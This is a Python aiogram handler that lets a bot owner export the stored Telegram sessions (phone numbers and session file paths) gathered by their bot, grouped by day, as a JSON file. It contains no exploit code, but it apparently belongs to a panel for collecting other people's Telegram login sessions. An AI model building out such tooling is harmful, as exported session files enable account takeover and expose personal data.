from __future__ import annotations

import io
import json
from collections import defaultdict
from datetime import datetime, timezone

from aiogram import F, Router
from aiogram.types import BufferedInputFile, CallbackQuery

from database import get_bot, get_bot_sessions
from handlers.cards import owns

router = Router()


def _build_payload(bot: dict, sessions: list[dict]) -> dict:
    by_day: dict[str, list[dict]] = defaultdict(list)
    for s in sessions:
        ts = int(s.get("created_at") or 0)
        dt = datetime.fromtimestamp(ts, tz=timezone.utc) if ts else None
        day = dt.strftime("%Y-%m-%d") if dt else "unknown"
        by_day[day].append({
            "phone": s.get("phone"),
            "session_path": s.get("session_path"),
            "created_at": ts,
            "created_at_iso": dt.isoformat() if dt else None,
        })
    days = [
        {"date": day, "count": len(items), "sessions": items}
        for day, items in sorted(by_day.items())
    ]
    return {
        "bot_username": bot.get("username"),
        "bot_tg_id": bot.get("tg_id"),
        "total": len(sessions),
        "exported_at": datetime.now(tz=timezone.utc).isoformat(),
        "days": days,
    }


@router.callback_query(F.data.startswith("export_sessions:"))
async def export_sessions(callback: CallbackQuery) -> None:
    bot_id = int(callback.data.split(":")[1])
    bot = get_bot(bot_id)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return

    tg_id = bot.get("tg_id")
    sessions = get_bot_sessions(tg_id) if tg_id else []
    if not sessions:
        await callback.answer("Сессий пока нет.", show_alert=True)
        return

    payload = _build_payload(bot, sessions)
    data = json.dumps(payload, ensure_ascii=False, indent=2).encode("utf-8")
    uname = (bot.get("username") or f"bot{bot_id}").lstrip("@")
    stamp = datetime.now(tz=timezone.utc).strftime("%Y%m%d_%H%M%S")
    fname = f"sessions_{uname}_{stamp}.json"

    await callback.message.answer_document(
        BufferedInputFile(data, filename=fname),
        caption=f"📥 Сессии — {uname}\nВсего: {payload['total']}, дней: {len(payload['days'])}",
    )
    await callback.answer()
